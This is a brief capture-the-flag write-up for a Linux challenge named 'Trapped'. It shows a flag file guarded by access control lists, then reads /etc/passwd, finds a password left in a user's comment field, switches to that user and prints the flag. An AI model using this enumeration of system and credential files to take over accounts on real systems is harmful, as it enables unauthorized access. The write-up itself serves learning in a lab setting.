#### Trapped
- points earned: 50 

#### Where's the flag?
- the flag is located in `/home/trapped` but is owned by root and readable by root group
- also has FIle Access Control Rules
```bash
trapped@b3fda8b87a72:~$ ls -l  
total 8  
----r-----+ 1 root root 27 Nov 17 05:28 flag.txt
```
#### Solution
- investigate `flag.txt`
	```bash
	trapped@b3fda8b87a72:~$ ls -l  
	total 8  
	----r-----+ 1 root root 27 Nov 17 05:28 flag.txt
	```
	- the `+` indicates that FIle Access Control rules are set
- check File Access Control rules
	```bash
	trapped@b3fda8b87a72:~$ getfacl flag.txt  
	# file: flag.txt  
	# owner: root  
	# group: root  
	user::---  
	user:secretuser:r--  
	group::---  
	mask::r--  
	other::---  
	```
	- user `secretuser` has read perms
- As part of standard enumeration I check `/etc/passwd` and found a password for `secretuser`
```bash
trapped@b3fda8b87a72:~$ cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
# ... truncated ... 
trapped:x:1000:1000::/home/trapped:/bin/bash  
secretuser:x:1001:1001:Unc0ntr0lled1234Passw0rd:/home/secretuser:/bin/sh
```
- switch to `secretuser` and read the flag
```bash
trapped@b3fda8b87a72:~$ su secretuser  
Password:    
$ cat flag.txt  
0xfun{4ccess_unc0ntroll3d}
```